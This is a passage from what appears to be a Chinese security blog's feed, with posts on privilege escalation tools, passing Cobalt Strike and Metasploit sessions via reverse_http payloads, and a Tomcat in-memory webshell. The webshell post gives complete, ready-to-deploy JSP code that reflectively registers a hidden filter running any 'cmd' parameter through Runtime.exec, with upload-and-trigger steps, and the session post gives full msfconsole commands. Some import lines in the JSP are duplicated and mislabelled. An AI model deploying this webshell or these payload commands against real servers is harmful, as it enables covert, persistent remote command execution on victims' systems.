</li><li><strong>DBA用户模式</strong>：拥有DBA账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。 </li><li><strong>注入提升模式</strong>： 拥有一个Oracle注入点，可以通过注入点执行系统命令，此种模式没有实现回显，需要自己验证。</li></ul><p>一般Oracle数据库利用这个工具进行提权（自带以上三种提权方式）： 下载地址:<a href="https://github.com/jas502n/oracleShell" target="_blank" rel="noopener">https://github.com/jas502n/oracleShell</a> </p></li></ul><h2 id="0x04-Linux提权"><a href="#0x04-Linux提权" class="headerlink" title="0x04 Linux提权"></a>0x04 Linux提权</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、信息收集脚本-LinEnum-master：https://github.com/rebootuser/LinEnum</span><br><span class="line"><span class="number">2</span>、漏洞探针脚本，获取可能存在的漏洞-linux-exploit-suggester：https://github.com/mzet-/linux-exploit-suggester</span><br><span class="line"><span class="number">3</span>、在进行linux提权时，推荐使用冰蝎，因为冰蝎里面有很多集成化功能，可以反弹shell到msf中-下载地址：https://github.com/rebeyond/Behinder</span><br></pre></td></tr></table></figure><ul><li><p><strong>SUID提权</strong></p></li><li><p><strong>内核漏洞提权</strong> </p><p>在内核漏洞提权时，前提要是本地用户才能进行提权。请参考：<a href="https://www.moonsec.com/archives/379" target="_blank" rel="noopener">https://www.moonsec.com/archives/379</a> </p></li><li><p><strong>脏牛提权</strong></p><p>请参考：<a href="https://www.cnblogs.com/xiaozi/p/13370721.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/13370721.html</a> </p></li><li><p><strong>定时任务提权</strong> </p><p>请参考：<a href="https://www.yidc.net/archives/4380" target="_blank" rel="noopener">https://www.yidc.net/archives/4380</a> </p></li><li><p><strong>环境变量提权</strong>  </p><p>请参考：<a href="https://www.freebuf.com/articles/system/173903.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/173903.html</a> </p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;提权总结&quot;&gt;&lt;a href=&quot;#提权总结&quot; class=&quot;headerlink&quot; title=&quot;提权总结&quot;&gt;&lt;/a&gt;提权总结&lt;/h1&gt;&lt;p&gt;转载自：&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>CS与MSF互转</title>
    <link href="http://bai-ren-1.github.io/2021/07/13/CS%E4%B8%8EMSF%E4%BA%92%E8%BD%AC/"/>
    <id>http://bai-ren-1.github.io/2021/07/13/CS%E4%B8%8EMSF%E4%BA%92%E8%BD%AC/</id>
    <published>2021-07-13T03:10:31.000Z</published>
    <updated>2021-07-13T03:13:54.606Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CS与MSF互转"><a href="#CS与MSF互转" class="headerlink" title="CS与MSF互转"></a>CS与MSF互转</h1><p>转载自：<a href="https://mp.weixin.qq.com/s/wyy42T0wPkpZBxbBsjcEmA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/wyy42T0wPkpZBxbBsjcEmA</a></p><h2 id="0x00-MSF转CS"><a href="#0x00-MSF转CS" class="headerlink" title="0x00 MSF转CS"></a>0x00 MSF转CS</h2><p>在cs中配置新监听器，beacon_http即可，设置好监听ip和端口；</p><p>使用msf payload_inject模块注入一个新的cs的shell：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> lhost cs的ip</span><br><span class="line"><span class="built_in">set</span> lport cs的port</span><br><span class="line"><span class="built_in">set</span> session 需要转换的session编号</span><br><span class="line"><span class="built_in">set</span> disablepayloadhandler true</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="0x01-CS转MSF"><a href="#0x01-CS转MSF" class="headerlink" title="0x01 CS转MSF"></a>0x01 CS转MSF</h2><p> 在msf中开启通常的监听：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> lhost xx.xx.xx.xx</span><br><span class="line"><span class="built_in">set</span> lport xxxx</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>在cs中选择已存在的shell，右键-&gt;spawn；</p><p>选择foreign类型的监听器，填写msf的ip和端口；</p><p>选择此监听器转换shell到msf</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CS与MSF互转&quot;&gt;&lt;a href=&quot;#CS与MSF互转&quot; class=&quot;headerlink&quot; title=&quot;CS与MSF互转&quot;&gt;&lt;/a&gt;CS与MSF互转&lt;/h1&gt;&lt;p&gt;转载自：&lt;a href=&quot;https://mp.weixin.qq.com/s/wyy42T
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Tomcat内存马</title>
    <link href="http://bai-ren-1.github.io/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://bai-ren-1.github.io/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2021-07-11T03:29:15.000Z</published>
    <updated>2021-07-12T08:49:34.828Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h1><ul><li>filter型</li><li>servlet型</li><li>listener型</li></ul><p>执行优先级是listener -&gt; filter -&gt; servlet</p><p>抄自：<a href="https://mp.weixin.qq.com/s/-jXAHHRCRilHrNN49QBcjQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/-jXAHHRCRilHrNN49QBcjQ</a></p><h2 id="0x00-filter型内存马"><a href="#0x00-filter型内存马" class="headerlink" title="0x00 filter型内存马"></a>0x00 filter型内存马</h2><h3 id="00-原理"><a href="#00-原理" class="headerlink" title="00 原理"></a>00 原理</h3><p>filter是javaweb中的过滤器，会对客户端发送的请求进行过滤并做一些操作，我们可以<strong>在filter中写入命令执行的恶意文件，让客户端发来的请求通过它来做命令执行</strong>。</p><p>而filter内存马是通过<strong>动态注册一个恶意filter</strong>，由于是动态注册的，所以这个filter没有文件实体，存在于内存中，随着tomcat重启而消失。</p><p>一般我们把这个filter放在所有filter最前面优先执行，这样我们的请求就不会受到其他正常filter的干扰。</p><h4 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h4><p>需要<strong>动态注册filter</strong>就需要几个添加filter相关的函数，ServletContext恰好可以满足这个条件</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.servlet.ServletContext</span><br></pre></td></tr></table></figure><p>ServletContext的方法中有addFilter、addServlet、addListener方法，即添加Filter、Servlet、Listener</p><p>获取ServletContext的方法</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.getServletContext(); <span class="keyword">this</span>.getServletConfig().getServletContext();</span><br></pre></td></tr></table></figure><h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><p>在Tomcat中org.apache.catalina.core.ApplicationContext中包含一个ServletContext接口的实现</p><p>所以需要import这个库，最后我们用到它获取Context</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;</span><br></pre></td></tr></table></figure><h4 id="filter相关变量"><a href="#filter相关变量" class="headerlink" title="filter相关变量"></a>filter相关变量</h4><ul><li>filterMaps变量：包含所有过滤器的URL映射关系；</li><li>filterDefs变量：包含所有过滤器包括实例内部等变量；</li><li>filterConfigs变量：包含所有与过滤器对应的filterDef信息及过滤器实例，进行过滤器进行管理：</li></ul><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.core.ApplicationFilterConfig"</span> %&gt;</span><br></pre></td></tr></table></figure><p>在tomcat不同版本需要通过不同的库引入FilterMap和FilterDef：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- tomcat <span class="number">7</span> --&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.deploy.FilterMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.deploy.FilterDef"</span> %&gt;</span><br></pre></td></tr></table></figure><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- tomcat <span class="number">8</span>/<span class="number">9</span> --&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.tomcat.util.descriptor.web.FilterDef"</span> %&gt;</span><br></pre></td></tr></table></figure><h3 id="01-实现"><a href="#01-实现" class="headerlink" title="01 实现"></a>01 实现</h3><h4 id="filter部分"><a href="#filter部分" class="headerlink" title="filter部分"></a>filter部分</h4><p>先通过一个简单的filter来看一下结构 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">filterDemo</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"init filter"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"exec filter"</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>filterDemo中有init、doFilter、destroy三个重要方法 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">init()方法：初始化参数，在创建Filter时自动调用，当我们需要设置初始化参数的时候，可以写到该方法中。</span><br><span class="line">doFilter()方法：拦截到要执行的请求时，doFilter就会执行。这里面写我们对请求和响应的预处理</span><br><span class="line">destory()方法：在销毁Filter时自动调用</span><br></pre></td></tr></table></figure><p>对我们来说，init和destory不需要做什么，只需要写一个doFilter方法拦截需要的请求，将其参数用于Runtime.getRuntime().exec()做命令执行，并将返回的数据打印到Response中即可，如下例： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">     String cmd = servletRequest.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">     <span class="keyword">if</span> (cmd!= <span class="keyword">null</span>) &#123;</span><br><span class="line">         Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">         java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                 <span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">         StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">         String line;</span><br><span class="line">         <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">             stringBuilder.append(line + <span class="string">'\n'</span>);</span><br><span class="line">         &#125;</span><br><span class="line">         servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">         servletResponse.getOutputStream().flush();</span><br><span class="line">         servletResponse.getOutputStream().close();</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="动态注册部分"><a href="#动态注册部分" class="headerlink" title="动态注册部分"></a>动态注册部分</h4><p>filter部分写好，下一步就是实现将其注入到内存中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从org.apache.catalina.core.ApplicationContext反射获取context方法</span></span><br><span class="line">ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">Field appctx = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">Field Configs = standardContext.getClass().getDeclaredField(<span class="string">"filterConfigs"</span>);</span><br><span class="line"></span><br><span class="line">Configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">String name = <span class="string">"filterDemo"</span>;</span><br><span class="line"><span class="comment">//判断是否存在filterDemo这个filter，如果没有则准备创建</span></span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>)&#123;</span><br><span class="line">    <span class="comment">//定义一些基础属性、类名、filter名等</span></span><br><span class="line">    filterDemo filter = <span class="keyword">new</span> filterDemo();</span><br><span class="line">    FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//添加filterDef</span></span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建filterMap，设置filter和url的映射关系,可设置成单一url如/xyz ,也可以所有页面都可触发可设置为/*</span></span><br><span class="line">    FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">    <span class="comment">// filterMap.addURLPattern("/*");</span></span><br><span class="line">    filterMap.addURLPattern(<span class="string">"/xyz"</span>);</span><br><span class="line">    filterMap.setFilterName(name);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//添加我们的filterMap到所有filter最前面</span></span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//反射创建FilterConfig，传入standardContext与filterDef</span></span><br><span class="line">    Constructor constructor = ApplicationFilterConfig<span class="class">.<span class="keyword">class</span>.<span class="title">getDeclaredConstructor</span>(<span class="title">Context</span>.<span class="title">class</span>, <span class="title">FilterDef</span>.<span class="title">class</span>)</span>;</span><br><span class="line">    constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将filter名和配置好的filterConifg传入</span></span><br><span class="line">    filterConfigs.put(name,filterConfig);</span><br><span class="line">    out.write(<span class="string">"Inject success!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    out.write(<span class="string">"Injected!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="完整filter内存马"><a href="#完整filter内存马" class="headerlink" title="完整filter内存马"></a>完整filter内存马</h4><p>最终jsp文件将其命名为1.jsp，然后只需<strong>传到web目录并访问一次jsp文件，然后再将/1.jsp换成/xyz?cmd=whoami</strong>访问即可 ：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.Context"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.core.ApplicationFilterConfig"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// tomcat 8/9 和 tomcat自己按实际选择使用，不用的就注释起来</span></span><br><span class="line">&lt;!-- tomcat <span class="number">8</span>/<span class="number">9</span> --&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.deploy.FilterMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.deploy.FilterDef"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tomcat <span class="number">7</span> --&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.deploy.FilterMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.deploy.FilterDef"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"javax.servlet.*"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"java.lang.reflect.Constructor"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"java.lang.reflect.Field"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"java.util.Map"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">filterDemo</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            String cmd = servletRequest.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd!= <span class="keyword">null</span>) &#123;</span><br><span class="line">                Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">                java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                        <span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">                StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    stringBuilder.append(line + <span class="string">'\n'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">                servletResponse.getOutputStream().flush();</span><br><span class="line">                servletResponse.getOutputStream().close();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//从org.apache.catalina.core.ApplicationContext反射获取context方法</span></span><br><span class="line">    ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">    appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">    Field Configs = standardContext.getClass().getDeclaredField(<span class="string">"filterConfigs"</span>);</span><br><span class="line">    Configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    String name = <span class="string">"filterDemo"</span>;</span><br><span class="line"><span class="comment">//判断是否存在filterDemo1这个filter，如果没有则准备创建</span></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="comment">//定义一些基础属性、类名、filter名等</span></span><br><span class="line">        filterDemo filter = <span class="keyword">new</span> filterDemo();</span><br><span class="line">        FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加filterDef</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建filterMap，设置filter和url的映射关系,可设置成单一url如/xyz ,也可以所有页面都可触发可设置为/*</span></span><br><span class="line">        FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">        <span class="comment">// filterMap.addURLPattern("/*");</span></span><br><span class="line">        filterMap.addURLPattern(<span class="string">"/xyz"</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加我们的filterMap到所有filter最前面</span></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射创建FilterConfig，传入standardContext与filterDef</span></span><br><span class="line">        Constructor constructor = ApplicationFilterConfig<span class="class">.<span class="keyword">class</span>.<span class="title">getDeclaredConstructor</span>(<span class="title">Context</span>.<span class="title">class</span>, <span class="title">FilterDef</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将filter名和配置好的filterConifg传入</span></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.write(<span class="string">"Inject success!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        out.write(<span class="string">"Injected!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>首先访问1.jsp成功注入内存：</p><p><img src="/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/1.png" alt></p><p>再访问/xyz?cmd=whoami触发，就能得到命令执行的结果：</p><p><img src="/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/2.png" alt></p><h3 id="02-踩坑"><a href="#02-踩坑" 